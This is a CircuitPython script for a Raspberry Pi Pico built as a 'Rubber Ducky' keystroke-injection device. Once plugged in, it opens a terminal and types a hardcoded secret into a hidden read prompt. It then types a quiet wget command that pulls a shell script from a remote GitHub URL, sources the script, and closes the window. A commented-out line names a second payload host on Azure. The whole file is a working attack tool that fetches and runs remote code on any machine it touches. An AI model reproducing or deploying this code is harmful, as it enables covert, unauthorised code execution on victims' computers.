# type: ignore
# code.py template for Raspberry Pi Pico 
# Tested using Circuit Python 7.0.0
# Requires adafruit_hid library

import usb_hid
import time
import usb_hid_map as usb

from adafruit_hid.keyboard import Keyboard

kbd = Keyboard(usb_hid.devices)

source = '\"https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/init_script.sh\"'
#source2 = '\"http://watcher.centralindia.cloudapp.azure.com:8080/target_bootstrap.sh\"'

key="uV2N981xqbXCHC8Z44qIJAgIwDQY9GLpNLF15BuHHhs="

def send(this_input, sleep=0.3):
    for item in this_input:
        if type(item) is list:
            kbd.send(*item)
        else:
            kbd.send(item)
    time.sleep(sleep)

def openShell():
    # kbd.send(usb.LEFT_CONTROL, usb.LEFT_ALT, usb.keys['t'])

    send([usb.WIN])
    send(usb.get_sequence('shell'))
    kbd.send(usb.LEFT_CONTROL, usb.ENTER)     # open new window
    time.sleep(0.5)

def enterKey():
    send(usb.get_sequence('read -s key'))
    send([usb.ENTER])
    send(usb.get_sequence(key))
    send([usb.ENTER])

def fetchRun():
    # obtain target from server
    payload_fetch = usb.get_sequence(' wget -q -o /dev/null '+source)
    payload_fetch.append(usb.ENTER)
    send(payload_fetch, sleep=0.7)

    # deploy
    payload_run = usb.get_sequence(' . init_script.sh')
    # payload4 = usb.get_sequence(' . target_bootstrap.sh')
    payload_run.append(usb.ENTER)
    send(payload_run)
    time.sleep(0.5)

    # Close Command: ALT+F4
    send([usb.CLOSE])

time.sleep(0.5)
openShell()
enterKey()
fetchRun()

